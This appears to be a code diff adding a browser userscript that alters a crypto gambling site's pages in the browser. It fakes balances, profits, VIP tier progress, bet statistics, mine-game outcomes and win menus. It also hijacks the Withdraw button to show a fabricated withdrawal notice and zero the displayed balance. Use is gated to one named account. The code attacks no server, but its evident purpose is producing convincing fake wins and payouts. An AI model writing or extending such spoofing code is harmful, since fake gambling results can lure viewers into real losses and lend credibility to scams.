+            multis = parseFloat(multiElement.value);
+            profit_on_win = desiredNumber * (multis - 1);
+
+            const profitElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label:nth-child(1) > div.input-wrap.svelte-1u979cd > div > input");
+            const profitLtcElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.labels.svelte-5v1hdl > span > div > div > div > div")
+
+            if (profitElement) {
+                profitElement.value = profit_on_win.toFixed(2);
+            }
+
+            if (currency === "ltc") {
+                const cryptoAmount = (profit_on_win / rate).toFixed(8);
+                profitLtcElement.innerText = cryptoAmount + " LTC";
+            } else if (currency === "eth") {
+                const cryptoAmount = (profit_on_win / rateeth).toFixed(8);
+                profitLtcElement.innerText = cryptoAmount + " ETH";
+            } else if (currency === "btc") {
+                const cryptoAmount = (profit_on_win / ratebtc).toFixed(8);
+                profitLtcElement.innerText = cryptoAmount + " BTC";
+            }
+        }
+
+        updatelimboProfitInterval = setTimeout(updateProfitValueslimbo, 50); // Check every 10 milliseconds
+    }
+    function balgonelimbo() {
+        if (!removedbal) {
+            removedbal = true;
+
+            observePastBetslimbo()
+
+            limboRemoveBalInterval = setTimeout(() => {
+                removedbal = false;
+            }, 100); // Adjust this timeout as needed
+        }
+    }
+
+    function waitForElement2limbo(selector, callback) {
+        const el = document.querySelector(selector);
+        if (el && el.dataset.test === "bet-button") {
+            el.addEventListener('click', function() {
+                const currentTime = new Date().getTime(); // Get current time
+                const timeDiff = currentTime - lastClickTime; // Calculate time difference
+                if (lastClickTime === 0 || timeDiff > 200) { // Check if lastClickTime is not defined or time difference is greater than 1.5 seconds (1500 milliseconds)
+                    balgonelimbo(); // Call balgone function
+                }
+                lastClickTime = currentTime; // Update last click time
+                callback(el);
+            });
+        } else {
+            setTimeout(() => {
+                waitForElement2limbo(selector, callback);
+            }, 10);
+        }
+    }
+
+
+    function replaceWithChildrenAndPrintRandom(elementKey) {
+        // Define the ranges for each element key
+        const ranges = {
+            'bronze': { min: 1000, max: 49999, text: "Bronze"},
+            'silver': { min: 50000, max: 99999, text: "Silver"},
+            'gold': { min: 100000, max: 249999, text: "Gold"},
+            'plat': { min: 250000, max: 499999, text: "Platinum"},
+            'plat2': { min: 500000, max: 999999, text: "Platinum II"},
+            'plat3': { min: 1000000, max: 2499999, text: "Platinum III"},
+            'plativ': { min: 2500000, max: 4999999, text: "Platinum IV"},
+            'platv': { min: 5000000, max: 9999999, text: "Platinum V"},
+            'platvi': { min: 10000000, max: 24999999, text: "Platinum VI"},
+            'diamond': { min: 25000000, max: 49999999, text: "Diamond"},
+            'diamond2': { min: 50000000, max: 99999999, text: "Diamond II"},
+            'diamond3': { min: 100000000, max: 249999999, text: "Diamond III"}
+        };
+
+        // Retrieve the random number for the chosen element key
+        const randomNumber = getRandomInt(ranges[elementKey].min, ranges[elementKey].max);
+        const formattedRandomNumber = formatNumberWithCommas(randomNumber);
+
+        // Calculate the percentage remaining
+        const percentageRemaining = calculatePercentageRemaining(ranges[elementKey].min, ranges[elementKey].max, randomNumber);
+
+        // Retrieve the serialized HTML string from local storage
+        const serializedHTML = localStorage.getItem(elementKey);
+        if (!serializedHTML) {
+            console.error(`No serialized HTML found in local storage for key '${elementKey}'.`);
+            return;
+        }
+
+        function replaceContent() {
+            try {
+                const parsedfar = new DOMParser().parseFromString(serializedHTML, 'text/html').body.firstChild;
+                const parsedElement = new DOMParser().parseFromString(serializedHTML, 'text/html').body.firstChild.firstChild;
+
+                const mainthing = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.user-tags.svelte-smmarv.boxed");
+
+                while (mainthing.firstChild) {
+                    mainthing.removeChild(mainthing.firstChild);
+                }
+
+                // Append children of parsed element to target element
+                while (parsedfar.firstChild) {
+                    mainthing.appendChild(parsedfar.firstChild);
+                }
+
+                // Select the target element to replace with its children
+                const targetElement = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(1) > span:nth-child(1)");
+                const target2 = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(2) > span:nth-child(1)");
+                const type1 = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(1) > span:nth-child(2)");
+                const type2 = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(2) > span:nth-child(2)");
+                const wager = document.querySelector("#modal-scroll > div > div > div.statistics.svelte-lchq7u > div:nth-child(4) > div.currency.svelte-141qgpc > span.content.svelte-141qgpc > span > span");
+
+                wager.textContent = '$' + formattedRandomNumber
+
+                document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.flex.justify-between.items-center.gap-5 > span.flex.gap-1 > span").innerText = (100 - percentageRemaining).toFixed(2) + "%"
+                document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.relative.w-full.my-2.overflow-hidden.rounded-\\[10px\\].bg-grey-400.h-\\[0\\.625em\\] > div").style.right = percentageRemaining + '%'
+                const targetTextElement = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.user-row.svelte-1xuxzlg > div > span.weight-semibold.line-height-default.align-left.size-md.text-size-md.variant-subtle.with-icon-space.is-truncate.svelte-17v69ua");
+                if (targetTextElement) {
+                    const originalText = targetTextElement.textContent;
+                    const transformedText = originalText.slice(0, 3) + '*'.repeat(originalText.length - 3);
+                    //targetTextElement.textContent = transformedText;
+                }
+
+                type1.textContent = ranges[elementKey].text;
+
+                // Replace the target element with its children
+                if (targetElement && parsedElement && target2 && type1 && type2) {
+                    // Find the previous element key
+                    let previousElementKey = null;
+                    switch (elementKey) {
+                        case 'bronze':
+                            previousElementKey = 'silver';
+                            break;
+                        case 'silver':
+                            previousElementKey = 'gold';
+                            break;
+                        case 'gold':
+                            previousElementKey = 'plat';
+                            break;
+                        case 'plat':
+                            previousElementKey = 'plat2';
+                            break;
+                        case 'plat2':
+                            previousElementKey = 'plat3';
+                            break;
+                        case 'plat3':
+                            previousElementKey = 'plativ';
+                            break;
+                        case 'plativ':
+                            previousElementKey = 'platv';
+                            break;
+                        case 'platv':
+                            previousElementKey = 'platvi';
+                            break;
+                        case 'platvi':
+                            previousElementKey = 'diamond';
+                            break;
+                        case 'diamond':
+                            previousElementKey = 'diamond2';
+                            break;
+                        case 'diamond2':
+                            previousElementKey = 'diamond3';
+                            break;
+                        case 'diamond3':
+                            previousElementKey = 'obsidian2';
+                            break;
+                        default:
+                            break;
+                    }
+
+                    const sert2 = localStorage.getItem(previousElementKey);
+                    const parsed2 = new DOMParser().parseFromString(sert2, 'text/html').body.firstChild.firstChild;
+                    type2.textContent = ranges[previousElementKey].text;
+
+                    // Clear existing content in target element
+                    while (target2.firstChild) {
+                        target2.removeChild(target2.firstChild);
+                    }
+
+                    // Append children of parsed element to target element
+                    while (parsed2.firstChild) {
+                        target2.appendChild(parsed2.firstChild);
+                    }
+
+                    // Clear existing content in target element
+                    while (targetElement.firstChild) {
+                        targetElement.removeChild(targetElement.firstChild);
+                    }
+
+                    // Append children of parsed element to target element
+                    while (parsedElement.firstChild) {
+                        targetElement.appendChild(parsedElement.firstChild);
+                    }
+                    const totalbets = localStorage.getItem('totalBets')
+                    const totalwins = localStorage.getItem('numberOfWins')
+                    const totallosses = localStorage.getItem('numberOfLosses')
+                    if (totalbets >= 2 && totalwins && totallosses) {
+                        document.querySelector("#modal-scroll > div > div > div.statistics.svelte-lchq7u > div:nth-child(1) > span.weight-bold.line-height-120pct.align-left.size-md.text-size-md.variant-highlighted.numeric.with-icon-space.svelte-17v69ua").innerText = formatNumberWithCommas(totalbets)
+                        document.querySelector("#modal-scroll > div > div > div.statistics.svelte-lchq7u > div:nth-child(2) > span.weight-bold.line-height-120pct.align-left.size-md.text-size-md.variant-highlighted.numeric.with-icon-space.svelte-17v69ua").innerText = formatNumberWithCommas(totalwins)
+                        document.querySelector("#modal-scroll > div > div > div.statistics.svelte-lchq7u > div:nth-child(3) > span.weight-bold.line-height-120pct.align-left.size-md.text-size-md.variant-highlighted.numeric.with-icon-space.svelte-17v69ua").innerText = formatNumberWithCommas(totallosses)
+
+                    }
+                } else {
+                    console.error("Target element or parsed element not found.");
+                }
+            } catch (error) {
+                console.error(`Error replacing element with children and printing random number for '${elementKey}':`, error);
+            }
+        }
+
+        function observeAndReplace() {
+            const observer = new MutationObserver((mutationsList, observer) => {
+                const element = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.user-tags.svelte-smmarv.boxed");
+                if (element) {
+                    observer.disconnect(); // Stop observing once the element is found
+                    replaceContent(); // Call the main function
+
+                    // Re-enable observation and replace after 10 seconds
+                    setTimeout(() => {
+                        observeAndReplace(); // Re-observe and call the function again
+                    }, 2000);
+                }
+            });
+
+            observer.observe(document.body, { childList: true, subtree: true });
+        }
+
+        observeAndReplace(); // Call the observation function initially
+    }
+
+    function calculateResult() {
+        if (!gameInProgress) {
+            const resultElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div > div > div > div.currency.svelte-141qgpc > span.content.svelte-141qgpc > span > span")
+            const multiplierElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div > div > div > span > span")
+
+            if (resultElement && multiplierElement) {
+                const multiplier = extractNumberFromString(multiplierElement.innerText);
+                const result = desiredNumber * multiplier;
+                changebal(result.toFixed(2) - 0);
+                resultElement.innerText = '$' + formatNumberWithCommas(result.toFixed(2));
+            }
+            gameInProgress = true
+        }
+    }
+    let sumsli = "94.1"
+    function watchAndCalculate() {
+        waitForElement("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div > div", calculateResult);
+        watchAndCalculateInterval = setTimeout(() => {
+            watchAndCalculate();
+        }, 2000); // Call watchAndCalculate again after 2000ms
+    }
+
+    function balgonekeno() {
+        if (!removedbal2) {
+            const balElement = getBalanceElement()
+            // Extract the current balance value
+            const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+
+            // Add the 'add' parameter to the current balance
+            const newBalance = currentBalance - desiredNumber;
+
+            // Format the new balance to have $ and two decimal places
+            const formattedBalance = '$' + formatNumberWithCommas(newBalance.toFixed(2));
+
+            // Update the balElement with the new value
+            balElement.innerText = formattedBalance;
+
+            removedbal2 = true;
+            gameInProgress2 = false
+            // Reset removedbal to false after balance is removed
+            KenoRemoveBalInterval = setTimeout(() => {
+                removedbal2 = false;
+            }, 100); // Adjust this timeout as needed
+        }
+    }
+    function balgone() {
+        if (!removedbal && profitfound) {
+            const balElement = getBalanceElement()
+            // Extract the current balance value
+            const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+
+            // Add the 'add' parameter to the current balance
+            const newBalance = currentBalance - desiredNumber;
+
+            // Format the new balance to have $ and two decimal places
+            const formattedBalance = '$' + formatNumberWithCommas(newBalance.toFixed(2));
+
+            if (removeBalActive) {
+                balElement.innerText = formattedBalance;
+                removedbal = true;
+                gameInProgress = false; // Set gameInProgress to true
+            }
+        }
+    }
+
+    function removeBal() {
+        if (removeBalActive) { // Check if removeBal is active
+            waitForElement2("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > button", balgone);
+        }
+        removeBalInterval = setTimeout(() => {
+            removeBal();
+        }, 250); // Call removeBal again after 250ms
+    }
+
+    function watchAndChangeValue() {
+        const profitElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.labels.svelte-5v1hdl > span > span");
+        const cryptoElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.labels.svelte-5v1hdl > span > div > div > div > div");
+
+        if (profitElement) {
+            profitfound = true;
+            const multiplier = extractNumberFromString(profitElement.innerText);
+            const result = desiredNumber * multiplier - desiredNumber;
+            const resultElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.input-wrap.svelte-1u979cd > div > input");
+            resultElement.value = formatNumberWithCommas(result.toFixed(2)); // Format result to have $ and two decimal places
+            if (currency === "ltc") {
+                const cryptoAmount = (result / rate).toFixed(8);
+                cryptoElement.innerText = cryptoAmount + " LTC";
+            } else if (currency === "eth") {
+                const cryptoAmount = (result / rateeth).toFixed(8);
+                cryptoElement.innerText = cryptoAmount + " ETH";
+            } else if (currency === "btc") {
+                const cryptoAmount = (result / ratebtc).toFixed(8);
+                cryptoElement.innerText = cryptoAmount + " BTC";
+            }
+        } else {
+            profitfound = false;
+        }
+        watchAndChangeValueInterval = setTimeout(watchAndChangeValue, 10); // Check every 10ms
+    }
+
+    // Function to parse XML string to DOM element
+    function parseXml(xmlString) {
+        const parser = new DOMParser();
+        const xml = parser.parseFromString(xmlString, "application/xml");
+        return xml.documentElement;
+    }
+
+    // Function to replace the last child of the target element with the saved LTC menu
+    function replaceLastChildWithLtcMenu() {
+        let MenuXmlString
+        if (currency === 'ltc') {
+            MenuXmlString = localStorage.getItem("ltc_menu");
+            if (!MenuXmlString) {
+                return;
+            }
+        } else if (currency === 'eth') {
+            MenuXmlString = localStorage.getItem("eth_menu");
+            if (!MenuXmlString) {
+                return;
+            }
+        } else if (currency === 'btc') {
+            MenuXmlString = localStorage.getItem("btc_menu");
+            if (!MenuXmlString) {
+                return;
+            }
+        }
+
+        // Parse the LTC menu XML string to a DOM element
+        const ltcMenu = parseXml(MenuXmlString);
+
+        // Find the target element
+        const targetElement = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div.flex.flex-col.gap-4 > div.currencies.svelte-1pzr0a");
+        if (targetElement) {
+            // Replace the last child of the target element with the LTC menu
+            const lastChild = targetElement.lastElementChild;
+            if (lastChild) {
+                targetElement.replaceChild(ltcMenu, lastChild);
+                const balElement = getBalanceElement()
+                // Extract the current balance value
+                const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+                document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div.flex.flex-col.gap-4 > div.flex.flex-col.gap-1 > div.currency.svelte-141qgpc > span.content.svelte-141qgpc > span > span").innerText = balElement.innerText
+                if (currency === 'ltc') {
+                    document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div.flex.flex-col.gap-4 > div.currencies.svelte-1pzr0a > div.currencies-item.svelte-1pzr0a > div > div.value-ctainer.svelte-1la41np > span:nth-child(1) > span").innerText = (currentBalance / rate).toFixed(8)
+                } else if (currency === 'eth') {
+                    document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div.flex.flex-col.gap-4 > div.currencies.svelte-1pzr0a > div.currencies-item.svelte-1pzr0a > div > div.value-ctainer.svelte-1la41np > span:nth-child(1) > span").innerText = (currentBalance / rateeth).toFixed(8)
+                } else if (currency === 'btc') {
+                    document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div.flex.flex-col.gap-4 > div.currencies.svelte-1pzr0a > div.currencies-item.svelte-1pzr0a > div > div.value-ctainer.svelte-1la41np > span:nth-child(1) > span").innerText = (currentBalance / ratebtc).toFixed(8)
+                }
+                document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div.flex.flex-col.gap-4 > div.currencies.svelte-1pzr0a > div.currencies-item.svelte-1pzr0a > div > div.value-ctainer.svelte-1la41np > span:nth-child(2) > span > span:nth-child(1)").innerText = balElement.innerText
+            }
+        }
+        setTimeout(observer.observe(document.documentElement, { childList: true, subtree: true }), 2000)
+    }
+
+    // Create a MutationObserver to observe changes in the DOM
+    const observer = new MutationObserver((mutationsList, observer) => {
+        // Check if the target element has been added to the DOM
+        const targetElement = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div.flex.flex-col.gap-4 > div.currencies.svelte-1pzr0a");
+        if (targetElement) {
+            // Disconnect the observer once the target element is found
+            observer.disconnect();
+            // Replace the last child of the target element with the LTC menu
+            replaceLastChildWithLtcMenu();
+        }
+    });
+
+    function checkForTargetElement() {
+        // Create a MutationObserver to observe changes in the DOM
+        const observer = new MutationObserver((mutationsList, observer) => {
+            // Check if the target element has been added to the DOM
+            const targetElement = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form");
+            if (targetElement) {
+                // Disconnect the observer once the target element is found
+                observer.disconnect();
+
+                const withdrewelmax = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form > label:nth-child(2) > div > div.input-content.svelte-1u979cd > input");
+                const withdrwel = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
+                const creptoel = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form > div.stack.x-stretch.y-center.gap-none.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > div > div > div > div > button > div > div > div.value-ctainer.svelte-1la41np > span:nth-child(1) > span");
+                const moneel = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form > div.stack.x-stretch.y-center.gap-none.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > div > div > div > div > button > div > div > div.value-ctainer.svelte-1la41np > span:nth-child(2) > span > span:nth-child(1)");
+                const balElement = getBalanceElement();
+                const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+
+                if (currency === 'ltc') {
+                    creptoel.innerText = (currentBalance / rate).toFixed(8);
+                    moneel.innerText = balElement.innerText;
+                } else if (currency === 'eth') {
+                    creptoel.innerText = (currentBalance / rateeth).toFixed(8);
+                    moneel.innerText = balElement.innerText;
+                } else if (currency === 'btc') {
+                    creptoel.innerText = (currentBalance / ratebtc).toFixed(8);
+                    moneel.innerText = balElement.innerText;
+                }
+
+                const targetButton = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form > label:nth-child(2) > div > div.input-button-wrap.svelte-1u979cd > button");
+                let triessss = 0
+                if (targetButton) {
+                    // Add a click event listener to the button
+                    targetButton.addEventListener('click', () => {
+                        if (currency === 'ltc') {
+                            withdrwel.innerText = ((currentBalance - 0.01) / rate).toFixed(8) + ' LTC';
+                            withdrewelmax.value = (currentBalance - 0.01).toFixed(2);
+                        } else if (currency === 'eth') {
+                            withdrwel.innerText = ((currentBalance - 1.71) / rateeth).toFixed(8) + ' ETH';
+                            withdrewelmax.value = (currentBalance - 1.71).toFixed(2);
+                        } else if (currency === 'btc') {
+                            withdrwel.innerText = ((currentBalance - 0.92) / ratebtc).toFixed(8) + ' BTC';
+                            withdrewelmax.value = (currentBalance - 0.92).toFixed(2);
+                        }
+                        function disableButtonActionAndAddListener(selector) {
+                            const button = document.querySelector(selector);
+                            if (!button) {
+                                console.error(`Button with selector "${selector}" not found.`);
+                                if (triessss > 65) {
+                                    triessss = 0
+                                    return
+                                } else {
+                                    triessss += 1
+                                    setTimeout(() => disableButtonActionAndAddListener(selector), 100);
+                                }
+
+                            } else {
+
+                                if (button.innerText.trim() === "Withdraw") {
+                                    // Create a new button element with the same properties and no event listeners
+                                    const newButton = button.cloneNode(true);
+                                    button.parentNode.replaceChild(newButton, button);
+
+                                    // Add custom event listener to the new button
+                                    newButton.addEventListener('click', function(event) {
+                                        event.stopImmediatePropagation(); // Prevents other listeners from running
+                                        event.preventDefault(); // Prevents the default action (e.g., submitting a form)
+                                        fakewith(); // Calls your custom function
+                                    }, true);
+
+                                } else {
+                                    setTimeout(() => disableButtonActionAndAddListener(selector), 20);
+                                }
+
+                            }
+                        }
+
+                        // Example usage of your custom function
+                        function fakewith() {
+                            let savedElement;
+                            let newValue
+
+                            if (currency === 'ltc') {
+                                newValue = formatNumberWithCommas((currentBalance - 0.01).toFixed(2));
+                                savedElement = loadElementFromLocalStorage('withdraw_ltc');
+                            } else if (currency === 'eth') {
+                                newValue = formatNumberWithCommas((currentBalance - 1.71).toFixed(2));
+                                savedElement = loadElementFromLocalStorage('withdraw_eth');
+                            } else if (currency === 'btc') {
+                                newValue = formatNumberWithCommas((currentBalance - 0.92).toFixed(2));
+                                savedElement = loadElementFromLocalStorage('withdraw_btc');
+                            }
+                            changeValueInElement(savedElement, newValue);
+
+                            const selector = '.notification-list.svelte-18t4teo[style="z-index: 1700"]';
+                            appendAndRemoveElementBySelector(selector, savedElement);
+
+                            const withdrewelmax = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form > label:nth-child(2) > div > div.input-content.svelte-1u979cd > input");
+                            const withdrwel = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
+                            const creptoel = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form > div.stack.x-stretch.y-center.gap-none.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > div > div > div > div > button > div > div > div.value-ctainer.svelte-1la41np > span:nth-child(1) > span");
+                            const moneel = document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form > div.stack.x-stretch.y-center.gap-none.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > div > div > div > div > button > div > div > div.value-ctainer.svelte-1la41np > span:nth-child(2) > span > span:nth-child(1)");
+                            const balElement = getBalanceElement();
+                            balElement.innerText = '$0.00'
+                            creptoel.innerText = '0.00000000';
+                            moneel.innerText = '$0.00';
+                            if (currency === 'ltc') {
+                                withdrwel.innerText = '0.00000000 LTC'
+                            } else if (currency === 'eth') {
+                                withdrwel.innerText = '0.00000000 ETH'
+                            } else if (currency === 'btc') {
+                                withdrwel.innerText = '0.00000000 BTC'
+                            }
+                            withdrewelmax.value = '0.00'
+                            document.querySelector("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form > label:nth-child(3) > div > div.input-content.svelte-1u979cd > input").value = ''
+                        }
+
+                        // Call the function
+                        disableButtonActionAndAddListener("#modal-scroll > div > div.content.svelte-ortsob > div > div > div > form > div:nth-child(5) > button");
+
+                    });
+                }
+
+                // Re-observe the document after 2 seconds
+                setTimeout(() => {
+                    observer.observe(document.documentElement, { childList: true, subtree: true });
+                }, 2000);
+            }
+        });
+
+        // Start observing the document for changes
+        observer.observe(document.documentElement, { childList: true, subtree: true });
+    }
+
+
+    function retryUntilTrue(condition, interval, clickedButtonIndex) {
+        return new Promise((resolve) => {
+            const checkCondition = () => {
+                if (condition()) {
+                    resolve();
+                } else {
+                    setTimeout(checkCondition, interval);
+                }
+            };
+            checkCondition();
+        });
+    }
+
+    function loadElementFromLocalStorage(key) {
+        const elementString = localStorage.getItem(key);
+        if (!elementString) {
+            console.error(`No saved element found with key "${key}".`);
+            return null;
+        }
+
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(elementString, "text/xml");
+        return doc.documentElement;
+    }
+
+    function changeValueInElement(element, newValue) {
+        const targetSpan = element.querySelector('.weight-normal.line-height-default.align-left.size-default.text-size-default.variant-subtle.numeric.with-icon-space.is-truncate.svelte-17v69ua span');
+        if (targetSpan) {
+            targetSpan.textContent = `$${newValue} `;
+        } else {
+            console.error('Target span not found.');
+        }
+    }
+
+    function appendAndRemoveElementBySelector(selector, element, timeout = 5000) {
+        const targetElement = document.querySelector(selector);
+        if (!targetElement) {
+            console.error(`Element with selector "${selector}" not found.`);
+            return;
+        }
+
+        targetElement.appendChild(element);
+
+        setTimeout(() => {
+            targetElement.removeChild(element);
+        }, timeout);
+    }
+
+
+    function turnintobombs() {
+        const buttonContainer = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div");
+        const buttons = buttonContainer.querySelectorAll('button');
+        const randomButtons = [];
+
+        // Select 3 unique random buttons
+        while (randomButtons.length < 5) {
+            const randomIndex = Math.floor(Math.random() * buttons.length);
+            if (!randomButtons.includes(buttons[randomIndex])) {
+                randomButtons.push(buttons[randomIndex]);
+            }
+        }
+
+        const waitForButtonsToChange = randomButtons.map((button) => {
+            return retryUntilTrue(() => {
+                return button.classList.contains('mine');
+            }, 95);
+        });
+
+        Promise.any(waitForButtonsToChange).then(() => {
+            buttons.forEach((button, index) => {
+                // Check if the xmlns attribute is present
+                const hasXmlns = button.hasAttribute("xmlns");
+
+                if (hasXmlns) {
+                    const thedeal = localStorage.getItem("copiedBomb");
+                    if (thedeal) {
+                        const parseddeal = new DOMParser().parseFromString(thedeal, 'text/html');
+                        button.replaceWith(parseddeal.body.firstChild);
+                    }
+                }
+            });
+        }).catch((error) => {
+        });
+    }
+
+    function restoreAttempt() {
+        const buttons = buttonContainer.querySelectorAll('button');
+        buttons.forEach((button, index) => {
+            // Check if the xmlns attribute is present
+            const hasXmlns = button.hasAttribute("xmlns");
+
+            if (hasXmlns) {
+                const thedeal = localStorage.getItem("uncovered")
+                if (thedeal) {
+                    const parseddeal = new DOMParser().parseFromString(thedeal, 'text/html');
+                    button.replaceWith(parseddeal.body.firstChild);
+                }
+            }
+        });
+
+        const thepup = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div > div")
+        if (thepup) {
+            thepup.remove()
+        }
+    }
+
+    function retryUntilTrue2(condition, interval, clickedButtonIndex) {
+        return new Promise((resolve) => {
+            const checkCondition = () => {
+                if (condition(clickedButtonIndex)) {
+                    resolve();
+                } else {
+                    setTimeout(checkCondition, interval);
+                }
+            };
+            checkCondition();
+        });
+    }
+    const thez = "ht"
+
+    function findGemElement(callback) {
+        const gemElement = document.querySelector('div.gem:not(button[xmlns="http://www.w3.org/1999/xhtml"] .gem)');
+
+        if (gemElement) {
+            const savedBomb = localStorage.getItem('copiedBomb');
+            if (savedBomb) {
+                const parsedBomb = new DOMParser().parseFromString(savedBomb, 'text/html');
+                const bombButton = document.createElement('button');
+                bombButton.setAttribute('xmlns', 'http://www.w3.org/1999/xhtml');
+                bombButton.classList.add('tile', 'mine', 'svelte-1avx2pj');
+                bombButton.setAttribute('data-test', 'mines-tile');
+                bombButton.setAttribute('data-revealed', 'false');
+                bombButton.appendChild(parsedBomb.body.firstChild); // Append parsed bomb element as a child of button
+
+                const gemParentNode = gemElement.parentNode;
+                gemParentNode.parentNode.replaceChild(bombButton.firstChild, gemParentNode);
+                let copiedWinMenuHTML;
+                if (currency === "ltc") {
+                    copiedWinMenuHTML = localStorage.getItem('copiedWinMenu');
+                } else if (currency === "eth") {
+                    copiedWinMenuHTML = localStorage.getItem('eth_win');
+                } else if (currency === "btc") {
+                    copiedWinMenuHTML = localStorage.getItem('btc_win');
+                }
+
+                if (copiedWinMenuHTML) {
+                    const parser = new DOMParser();
+                    const copiedWinMenu = parser.parseFromString(copiedWinMenuHTML, 'text/html');
+                    buttonContainer.appendChild(copiedWinMenu.body.firstChild);
+                    document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > button").addEventListener("click", function() {
+                        restoreAttempt()
+                    });
+                }
+            }
+        } else {
+            // Retry after a delay of 10ms
+            setTimeout(() => {
+                findGemElement(callback);
+            }, 10);
+        }
+    }
+
+    function getStakeuser() {
+        // Use querySelector to find the element by its class
+        const element = document.querySelector('.weight-semibold.line-height-default.align-left.size-md.text-size-md.variant-highlighted.with-icon-space.svelte-17v69ua');
+
+        // Check if the element exists
+        if (element) {
+            // Extract and log the text content
+            const text = element.textContent;
+            return text
+        } else {
+            return "noty"
+        }
+    }
+
+    function checkRegistrationStatus() {
+
+        const username = getStakeuser();
+        if (username == "Vihreaa") {
+            if (!loggedin) {
+                checkAccessGranted()
+                if (showaccess) {
+                    showModal("Access Granted");
+                }
+                if (localStorage.getItem('toggleBlurVipProgress') === '1') {
+                    const blurEffect = localStorage.getItem('blurEffect');
+                    if (blurEffect === 'rgbBlur') {
+                        setTimeout(disableBlurEffect, 700)
+                    } else {
+                        disableBlurEffect()
+                    }
+                }
+                checkForTargetElement()
+                checkCryptoTitle()
+                mains();
+            }
+        } else {
+            showModal("Access not Granted");
+        }
+        registrationChecked = true;
+    }
+
+    function clearWatchButtonIntervals() {
+        clearTimeout(watchButtonAndUpdateInterval);
+        clearTimeout(watchButton2AndUpdateInterval);
+        clearTimeout(mainsInterval)
+    }
+
+    function clearWatchIntervals() {
+        clearTimeout(watchAndChangeValueInterval);
+        clearTimeout(watchAndCalculateInterval);
+        clearTimeout(removeBalInterval);
+        clearTimeout(minesInterval)
+    }
+
+    function clearDiceIntervals() {
+        clearTimeout(updateProfitInterval)
+        clearTimeout(removeBalDiceInterval)
+        clearTimeout(diceInterval)
+        clearTimeout(diceRemoveBalInterval)
+    }
+
+    function clearLimboIntervals() {
+        clearTimeout(limboRemoveBalInterval)
+        clearTimeout(updatelimboProfitInterval)
+        clearTimeout(removeBallimboInterval)
+        clearTimeout(LimboInterval)
+    }
+    function clearKenoIntervals() {
+        clearTimeout(removeBalKenoInterval)
+        clearTimeout(watchAndCalculatekenoInterval)
+        clearTimeout(kenoInterval)
+        clearTimeout(KenoRemoveBalInterval)
+        clearTimeout(removeBalKenoInterval2)
+    }
+
+    function bjmain() {
+        watchButton2AndUpdate()
+        watchButtonAndUpdate()
